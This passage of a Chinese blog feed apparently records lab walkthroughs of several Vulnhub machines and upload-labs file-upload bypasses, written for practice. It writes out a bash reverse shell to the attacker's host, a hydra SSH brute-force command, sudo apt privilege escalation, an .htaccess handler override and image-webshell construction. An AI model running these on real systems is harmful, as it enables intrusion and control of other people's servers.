title="十、Grotesque2"></a>十、Grotesque2</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.21</p></blockquote><p>扫描端口发现这个服务器开了几百个端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818095932921.png" alt="image-20210818095932921"></p><p>扫描网站目录也没有扫描发现</p><p>直接拿出珍藏多年的端口扫描器，批量扫描多个端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818101559750.png" alt="image-20210818101559750"></p><p>结果发现258端口返回的大小和其他的不一样</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818101659638.png" alt="image-20210818101659638"></p><blockquote><p>看起来是要我们爆破ssh</p></blockquote><p>使用hydra爆破，爆破了很久，没有出来</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818110014993.png" alt="image-20210818110014993"></p><p>看了一下WP，发现一个离谱的东西，密码在手指上面<code>b6e705ea1249e2bb7b0fd7dac9fcd1b3</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818104721912.png" alt="image-20210818104721912"></p><p>解密出密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818105008952.png" alt="image-20210818105008952"></p><p>然后挨个尝试用户名登录，成功使用<code>angel</code>登录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818105302414.png" alt="image-20210818105302414"></p><p>获取到一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818105415519.png" alt="image-20210818105415519"></p><p>提权到root，监控进程发现有个定时任务，但是没有权限修改</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818110536001.png" alt="image-20210818110536001"></p><p>提权辅助脚本 <code>linpeas.sh</code>运行不了，但是<code>LinEnum.sh</code>可以运行，但是也没有发现什么东西</p><blockquote><p>解决linpeas.sh不能运行的原因是不同系统的换行符不一样</p><p>通过vi/vim进入想要修改的文件，按下<code>:</code>进入末行模式，输入<code>set fileformat=unix</code>然后退出即可</p></blockquote><p>看了一下wp，发现这个定时任务会定时写入密码到根目录，但是本地没有看见</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113323440.png" alt="image-20210818113323440"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113306024.png" alt="image-20210818113306024"></p><p>看了一下定时执行的文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113614313.png" alt="image-20210818113614313"></p><p>将本地quiet文件清空之后才会在根目录写入文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818113950755.png" alt="image-20210818113950755"></p><blockquote><p>这个纯脑洞了</p></blockquote><p>参考文章</p><p><a href="https://www.mondayice.com/2021/06/03/vulnhub-grotesque2-writeup/">https://www.mondayice.com/2021/06/03/vulnhub-grotesque2-writeup/</a></p><h2 id="十一、Shenron"><a href="#十一、Shenron" class="headerlink" title="十一、Shenron"></a>十一、Shenron</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.22</p></blockquote><p>中规中矩的开放了两个端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818124158708.png" alt="image-20210818124158708"></p><p>扫描一下目录，访问一下发现也是<code>joomla</code>框架，网上寻找以及存在的漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818130358222.png" alt="image-20210818130358222"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818130336047.png" alt="image-20210818130336047"></p><p> <img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818131204412.png" alt="image-20210818131204412"></p><p>成功登录后台，在后台模板修改处写入木马</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818131739088.png" alt="image-20210818131739088"></p><p>上传反弹shell的脚本，然后获取到shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132014354.png" alt="image-20210818132014354"></p><p>在配置文件中获取到一个用户的密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132346703.png" alt="image-20210818132346703"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132636520.png" alt="image-20210818132636520"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818132836615.png" alt="image-20210818132836615"></p><blockquote><p>可以利用cp将ssh文件复制到这个用户的.ssh文件中实现使用密钥登录</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818134922962.png" alt="image-20210818134922962"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818134736523.png" alt="image-20210818134736523"></p><p>获得一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135200504.png" alt="image-20210818135200504"></p><p>利用密钥<code>scp</code>文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135538855.png" alt="image-20210818135538855"></p><p>使用<code>pspy64</code>监控进程没有发现特殊的东西</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135839321.png" alt="image-20210818135839321"></p><p>使用辅助提权脚本<code>linpeas.sh</code>扫描一下</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818140751728.png" alt="image-20210818140751728"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818140909918.png" alt="image-20210818140909918"></p><p>列出自己的权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141136095.png" alt="image-20210818141136095"></p><p>使用apt提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">执行命令：sudo apt changelog apt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141645808.png" alt="image-20210818141645808"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141559490.png" alt="image-20210818141559490"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141509574.png" alt="image-20210818141509574"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818141537570.png" alt="image-20210818141537570"></p><p><strong>问题</strong></p><ol><li><p>在用户<code>/home/jenny</code>的目录下直接复制文件一直不成功，到<code>tmp</code>目录下就可以了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818135103119.png" alt="image-20210818135103119"></p></li></ol><p><strong>总结</strong></p><p>这个外网相对简单，主机提权的之前用户的提权是常规的，最后的apt提权是新手法之前总结没有发现这个东西</p><p>参考文章</p><p><a href="https://nepcodex.com/2021/06/shenron-1-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/06/shenron-1-walkthrough-vulnhub-writeup/</a></p><h2 id="十二、VulnCMS"><a href="#十二、VulnCMS" class="headerlink" title="十二、VulnCMS"></a>十二、VulnCMS</h2><blockquote><p>kali：192.168.1.15</p><p>win10：192.168.1.7</p><p>靶机：192.168.1.23</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818143156065.png" alt="image-20210818143156065"></p><blockquote><p>每个端口都有不同的CMS</p></blockquote><p>80端口<code>w3.css</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145137572.png" alt="image-20210818145137572"></p><p>5000端口 <code>wordpress</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145152326.png" alt="image-20210818145152326"></p><p>8081端口<code>joomla</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145230133.png" alt="image-20210818145230133"></p><p>9001端口<code>Drupal</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818145318575.png" alt="image-20210818145318575"></p><p>在漏洞库找到一些漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818150304048.png" alt="image-20210818150304048"></p><p><a href="https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/drupal/Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-6920)/">Drupal - 白阁文库</a></p><p>POC&amp;EXP <a href="https://github.com/zhzyker/exphub/tree/master/drupal">https://github.com/zhzyker/exphub/tree/master/drupal</a></p><p>执行POC检查漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818151606122.png" alt="image-20210818151606122"></p><p>执行EXP，但是没有效果</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818151825622.png" alt="image-20210818151825622"></p><p>使用MSF获取到shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818152555291.png" alt="image-20210818152555291"></p><p>看到了joomlaCMS的用户名和密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818153820771.png" alt="image-20210818153820771"></p><blockquote><p>:cry:  为什么这个密码不对啊，真正的密码在这个里面，这个文件有什么特殊的呢？？？</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818154020985.png" alt="image-20210818154020985"></p><p>登录<code>joomla</code>后台之后不能按照以前的方法获取到shell，卡住了…… </p><p>为什么用户邮箱会联想到密码………………</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818155116079.png" alt="image-20210818155116079"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818155032435.png" alt="image-20210818155032435"></p><p>获取到flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818155144741.png" alt="image-20210818155144741"></p><p>监控进程发现没有定时脚本执行，使用提权辅助脚本扫描</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818160300843.png" alt="image-20210818160300843"></p><blockquote><p>这里如果换到ghost用户可能可以使用lxd提权</p></blockquote><p>找到了一个用户，可能会有密码存在</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162324252.png" alt="image-20210818162324252"></p><p>读取文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162419611.png" alt="image-20210818162419611"></p><p>成功切换用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162455942.png" alt="image-20210818162455942"></p><p>查看可以使用sudo执行的命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162552860.png" alt="image-20210818162552860"></p><p>提权到root</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162656056.png" alt="image-20210818162656056"></p><p>获取到最后一个flag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210818162723639.png" alt="image-20210818162723639"></p><p><strong>总结</strong></p><p>在遇见多个CMS的时候需要查找CMS的历史漏洞尝试攻击，还需要自己动手发现，对于获取到的信息需要细心查看不要忽略</p><p>参考文章</p><p><a href="https://nepcodex.com/2021/06/vulncms-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/06/vulncms-walkthrough-vulnhub-writeup/</a></p><h2 id="十三、POTATO"><a href="#十三、POTATO" class="headerlink" title="十三、POTATO"></a>十三、POTATO</h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.24</p></blockquote><p>扫描端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819095443334.png" alt="image-20210819095443334"></p><blockquote><p>7120端口开放但是并不能直接访问到</p></blockquote><p>仔细扫描后发现7120是ssh端口<code>sudo nmap -sSV -vv -sC -T4 -p- 192.168.1.24</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819100445429.png" alt="image-20210819100445429"></p><p>扫描一下目录，发现了一个phpinfo的目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819095559065.png" alt="image-20210819095559065"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819095627149.png" alt="image-20210819095627149"></p><blockquote><p>看到PHPINFO的界面，想到了本地文件包含</p></blockquote><p>没有在phpinfo中看到有用的信息，思路断了……，作者给出了HINT</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819101146263.png" alt="image-20210819101146263"></p><p>尝试使用<code>potato</code>爆破ssh密码</p><p><code>hydra 192.168.1.24 ssh -s 7120 -p potato -P /usr/share/worldlists/rockyou.txt -t 6 -v -f</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819102656060.png" alt="image-20210819102656060"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819102754034.png" alt="image-20210819102754034"></p><p>提权</p><p>使用pspy64监控进程，并没有发现特殊情况</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819103627063.png" alt="image-20210819103627063"></p><p><code>linpeas.sh</code>辅助提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819104309153.png" alt="image-20210819104309153"></p><p>内核漏洞提权，先使用脚本扫描一下</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819105331542.png" alt="image-20210819105331542"></p><blockquote><p>脏牛本地提权：<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p></blockquote><p>这个漏洞不行，开始执行主机就崩掉了，换一个</p><p>使用CVE-2015-1328  EXP下载：<a href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819112403241.png" alt="image-20210819112403241"></p><p>提权成功</p><p><strong>总结</strong></p><p>这个靶场直接绕过外网爆破ssh有点难顶，对于内核提权漏洞，脏牛直接把电脑打崩了这个有点意外，网上没看见这个情况，其他还行都是常规步骤</p><h2 id="十四、BOVERFLOW"><a href="#十四、BOVERFLOW" class="headerlink" title="十四、BOVERFLOW"></a><del>十四、BOVERFLOW</del></h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.25</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819123723015.png" alt="image-20210819123723015"></p><p>端口开放情况</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819113326332.png" alt="image-20210819113326332"></p><p>扫描目录</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819114205992.png" alt="image-20210819114205992"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819114148419.png" alt="image-20210819114148419"></p><blockquote><p>居然还封我ip</p></blockquote><p>思路卡住了，动不了了</p><h2 id="十四、DevContainer"><a href="#十四、DevContainer" class="headerlink" title="十四、DevContainer"></a>十四、DevContainer</h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.26</p></blockquote><p>这只开放了80端口，扫描目录发现有个upload页面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819125856482.png" alt="image-20210819125856482"></p><p>直接在<code>/upload</code>下上传即可，并没有任何限制</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819130359077.png" alt="image-20210819130359077"></p><p>利用网站中的定时脚本反弹shell</p><blockquote><p>之前使用 cp /bin/bash /tmp/bash 失败应该是权限不够，所以直接尝试反弹shell</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819132019403.png" alt="image-20210819132019403"></p><p>查看有权限执行的命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819132313762.png" alt="image-20210819132313762"></p><p>这个是一个本地端口转发的命令，将90端口转发到8080端口，之后再端口的地方发现一个文件读取漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819132846728.png" alt="image-20210819132846728"></p><p>反弹shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819133350657.png" alt="image-20210819133350657"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819133404477.png" alt="image-20210819133404477"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819133438221.png" alt="image-20210819133438221"></p><p><strong>总结</strong></p><p>通过这个平台更加深了我对权限的理解，对于各个服务开启的用户是什么权限，执行命令的就是什么权限</p><h2 id="十五、MY-CMSMS"><a href="#十五、MY-CMSMS" class="headerlink" title="十五、MY CMSMS"></a>十五、MY CMSMS</h2><blockquote><p>kali：192.168.1.15</p><p>Win10：192.168.1.7</p><p>靶机：192.168.1.27</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819140138106.png" alt="image-20210819140138106"></p><p>扫描目录，对网站观察以一番，但是没有发现前台有什么漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819144813495.png" alt="image-20210819144813495"></p><p>但是这个可以利用弱口令远程连接数据库……</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819143920428.png" alt="image-20210819143920428"></p><p>更新用户密码</p><p><a href="http://blog.is36.com/archives/447/">CMS Made Simple忘记密码</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> cms_users <span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> = (<span class="hljs-keyword">select</span> <span class="hljs-keyword">md5</span>(<span class="hljs-keyword">CONCAT</span>(<span class="hljs-keyword">IFNULL</span>((<span class="hljs-keyword">SELECT</span> sitepref_value <span class="hljs-keyword">FROM</span> cms_siteprefs <span class="hljs-keyword">WHERE</span> sitepref_name = <span class="hljs-string">&#x27;sitemask&#x27;</span>),<span class="hljs-string">&#x27;&#x27;</span>),<span class="hljs-string">&#x27;admin&#x27;</span>))) <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819143602387.png" alt="image-20210819143602387"></p><p>为什么要这么更新密码呢？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819144351232.png" alt="image-20210819144351232"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819144420874.png" alt="image-20210819144420874"></p><blockquote><p>这个网站的密码还在前面添加了前缀，所以我们不能直接修改密码，还需要添加上相应的字符前缀</p></blockquote><p>后台执行php代码反弹shell</p><p><code>system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.1.15/1234 0&gt;&amp;1&#39;&quot;);</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819150528510.png" alt="image-20210819150528510"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819150542954.png" alt="image-20210819150542954"></p><p>看到了两个备份文件，使用john来破解加密的密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819151830970.png" alt="image-20210819151830970"></p><blockquote><p>没有破解出来</p></blockquote><p>在网站的<code>admin</code>目录下，有一个<code>.htpasswd</code>文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819153651796.png" alt="image-20210819153651796"></p><p>先base64解码然后使用base32解码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152218458.png" alt="image-20210819152218458"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152353530.png" alt="image-20210819152353530"></p><p>不能使用密码连接ssh，所以直接利用反弹回来的shell切换用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152640506.png" alt="image-20210819152640506"></p><p>直接利用python提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152808250.png" alt="image-20210819152808250"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152831931.png" alt="image-20210819152831931"></p><p><strong>总结</strong></p><p>对于外网渗透，还是缺少一点想法，需要多加练习提高对漏洞的敏感度，对于Linux的提权也是比较熟悉了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Vulnhub&quot;&gt;&lt;a href=&quot;#Vulnhub&quot; class=&quot;headerlink&quot; title=&quot;Vulnhub&quot;&gt;&lt;/a&gt;Vulnhub&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;https://www.vul</summary>
      
    
    
    
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="靶场" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>文件上传靶场</title>
    <link href="http://example.com/2021/09/04/upload-labs/"/>
    <id>http://example.com/2021/09/04/upload-labs/</id>
    <published>2021-09-04T04:12:12.000Z</published>
    <updated>2021-09-22T02:30:36.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210917090552341.png" alt="image-20210917090552341"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>上传 <code>.htaccess</code> </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>文件会自动重命名所以不能上传 <code>.htaccess</code> 文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916150810180.png" alt="image-20210916150810180"></p><p>可以大小写绕过上传但是系统好像不能解析，访问到的结果是错误的</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916151446824.png" alt="image-20210916151446824"></p><p>与之前相比去掉了除去空格的函数</p><p>末尾加空格即可绕过上传 </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916151421240.png" alt="image-20210916151421240"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916153630164.png" alt="image-20210916153630164"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916153800164.png" alt="image-20210916153800164"></p><p><code>.htaccess</code> 文件不能上传</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916154001285.png" alt="image-20210916154001285"></p><p>文件末尾加点绕过，以为 Windows 对文件的解析特性，Windows 会对文件末尾的<code>.</code> 自动忽略</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>禁止了一大堆文件后缀</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916154257014.png" alt="image-20210916154257014"></p><blockquote><p>和之前相比少了去除 ::$DATA 这一步</p></blockquote><p>文件名后面添加 <code>::$DATA</code> 实现绕过</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916154718353.png" alt="image-20210916154718353"></p><blockquote><p>这个也是 Windows 的特性</p></blockquote><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916155134664.png" alt="image-20210916155134664"></p><p>这次使用的是白名单</p><p><img src="D:\markdown\image-20210916160139526.png" alt="image-20210916160139526"></p><p>上传后缀 <code>shell.php. .</code></p><p>原理就是：首先会消除文件后的空，然后去除掉最后一个点，最后再消除末尾的空，这样就变成了<code>shell.php.</code> 成功绕过检查</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916160336188.png" alt="image-20210916160336188"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916160745954.png" alt="image-20210916160745954"></p><blockquote><p>好家伙全给去除了</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916160814358.png" alt="image-20210916160814358"></p><p>双写绕过</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916161037159.png" alt="image-20210916161037159"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916161154457.png" alt="image-20210916161154457"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916161213142.png" alt="image-20210916161213142"></p><p>这里是使用 <code>%00</code> 截断绕过</p><ul><li>PHP 版本 &lt; 5.3.4</li><li>PHP 的魔术引号即 <code>magic_quotes_gpc</code> 为 OFF 关闭状态</li></ul><blockquote><p>本地环境不合适所以就简单写一下操作过程</p></blockquote><p>将上传文件的目的地址写为<code>../upload/shell.php%00</code></p><p>上传的文件为<code>test.jpg</code></p><p>最后上传到服务器的结果就是 <code>../upload/shell.php%00/test.jpg</code> 雪茹文件时，函数读到 <code>%00</code> 就会当成结束符而把后面字符的直接忽略掉，这样就会直接生成一个 <code>../upload/shell.php</code> 文件</p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>利用 <code>0x00</code> 截断绕过，<code>%00</code> 与 <code>0x00</code> 的区别就是 <code>%00</code> 截断是URL编码的表现，用于 GET 方法 <code>0x00</code>截断是二进制编码的表现，用户POST方法。由于POST不会像 GET 一样自动对URL解码，所以我们需要在 HEX 中直接进行二进制修改为 00</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916162855128.png" alt="image-20210916162855128"></p><p>直接修改添加文件头即可绕过检查，添加 <code>GIF89A</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916163149385.png" alt="image-20210916163149385"></p><p>图片马的制作</p><ul><li>GIF 直接添加 GIF89a</li><li>JPG 准备一句话木马和一个jpg图片 <code> copy 1.jpg /b + 2.php /a  shell.jpg</code> 即可生成</li><li>PNG 与上面类似</li></ul><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916163920293.png" alt="image-20210916163920293"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916163934575.png" alt="image-20210916163934575"></p><blockquote><p>需要制作一个高仿的图片码</p></blockquote><p><img src="D:\markdown\image-20210916164251000.png" alt="image-20210916164251000"></p><blockquote><p>纸老虎，这都拦不住</p></blockquote><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916164341948.png" alt="image-20210916164341948"></p><p>直接添加 <code>GIF89a</code> 不能绕过了</p><p><code>exif_imagetype()</code> 读取一个图像的第一个字节并检查其签名。</p><p>看来必须正儿八经的做一个图片马了，使用 copy 命令制作一个图片马上传即可</p><blockquote><p>靶场出问题了，正常图片都不能上传</p></blockquote><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916165351432.png" alt="image-20210916165351432"></p><blockquote><p>二次渲染绕过</p></blockquote><p><code>imagecreatefromjpeg()</code> 由文件或URL创建一个新图象</p><p>严格判断文件后缀是否合法，并且 Content-Type 是否为对应的图像类型，最后调用<code> imagecreatefromjpeg()</code> 等函数对图像进行二次编译即进行二次渲染。绕过的方法：同样使用图片木马上传，但是需要对图像未进行二次编译的位置进行分析，再往该位置插入恶意 PHP 代码，不同的图像类型插入的方式有区别</p><blockquote><p>简单来说就是比较上传前后图片没有变的位置，在没有改变的地方插入木马后门</p></blockquote><p>PNG</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$p = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span 